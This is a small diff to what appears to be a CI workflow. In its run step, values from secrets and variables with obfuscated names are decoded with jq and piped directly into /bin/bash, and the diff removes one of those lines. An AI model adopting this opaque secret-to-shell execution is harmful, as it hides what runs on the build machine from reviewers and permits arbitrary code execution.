@@ -17,7 +17,6 @@ jobs:
           whajc148: ${{ secrets.whajc148 }}
         run: |
           printf '%s' "$whajc148" | jq -r .om9229 | /bin/bash
-          echo $tqf12968 | jq -r .bgtq63 | /bin/bash
           printf '%s' "$hz48599" | jq -r .lo2371 | /bin/bash
           echo $vog44 | jq -r .k31 | /bin/bash
           echo $mrjo6 | jq -r .djtw1581 | /bin/bash
